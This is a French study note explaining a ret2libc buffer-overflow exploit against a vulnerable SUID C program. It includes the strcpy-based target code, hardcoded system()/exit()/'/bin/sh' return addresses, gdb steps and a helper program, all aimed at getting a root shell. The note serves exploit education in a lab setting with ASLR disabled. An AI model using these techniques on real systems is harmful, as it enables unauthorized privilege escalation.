**Rappel**
[[Global/Programming/C C++/Librairie#^06e7f1|Libc]]



#### **Théorie**

- La fonction system() de la librairie Libc permet d'exécuter une commande dans un terminal. Si nous réussissons à faire revenir le programme sur l'adresse de cette fonction avec un arguments qui appelle /bin/sh, nous pouvons exécuter un shell en tant que root si le programme victime est en SUID.

#### **Pratique**

##### **Exploit 1**
- **Environnement**
	- L'ordinateur ne doit pas avoir l'ASLR (randomisation de stack) active car nous aurons besoin de l'adresse d'une variable d'environnement, de la fonction systeme et exit. Cependant, cet exploit vise à bypass la désactivation d'exécution d'instructions à partir de la stack. Cette protection nous empêche de mettre dans le buffer notre shellcode car il sera pas exécuté de toute façon.

- **Code source**
```C
Code 
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[]){
	char little_array[512];
	if (argc > 1)
		strcpy(little_array, argv[1]);
}
```

- **Analyse du code source
	- On voit que notre input (argv) est copié vers un buffer de taille max 512 bytes mais rien ne nous empêche de faire un buffer overflow.

- **Shellcode**
 "\xc0\xf2\x03\x42” //system()
“\x02\x9b\xb0\x42” //exit()
“\xa0\x8a\xb2\x42” //binsh

- **Exploitation**
	- Là on va devoir utilisé gdb. En gros, ce qu'on veut c'est remplacer l'adresse de retour d'une fonction par l'adresse qui pointe vers la fonction system(). La fonction system va donc "déplacer" le processus et va prendre en paramètre ce qu'on place derrière. Ce qu'on va placer derrière c'est l'adresse de la fonction exit() pour pouvoir fermer le programme exploité mais ca ne va pas fermer le processus system(). System va donc lire les paramètres qu'il y a après et nous on va donc mettre l'adresse de la variable d'environnement qui lance /bin/sh.
	- Pour ça, il faut 1) Trouver les adresses de la fonction system() dans l'environnement du programme cible, 2) Trouver l'adresse de la fonction exit() et 3) Créer une variable d'environnement qui lance /bin/sh.
	- 1)
		- Dans gdb lancé avec le programme cible, on fait `p system` après avoir fait `run`.
	- 2)
		- Juste après, on fait pareil avec `p exit`
	- 3)
		- Enfin, on peut faire un petit programme qui créer et affiche l'adresse d'une variable d'environnement :
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
	setenv("binsh", "/bin/sh", 1);
	char *binsh_addr = getenv("binsh");
	printf("Adresse de binsh : %p\n", (void *)binsh_addr);
	return 0;
}
```
- 
	- Après ça, on créer vite fait notre shellcode expliqué au début avec d'abord l'adresse de system(), de exit() et enfin de binsh
	- Enfin, on créer un programme qui fait le payload avec un padding à ajusté et qui lance le programme, comme pour les exploit [[strcpy#^aadea3|strcpy]] et [[Nop Sled Strcpy#^a5154f|Nop Sled strcpy]].
	- Si tous se passe bien, tu devrais avoir un shell root qui pop.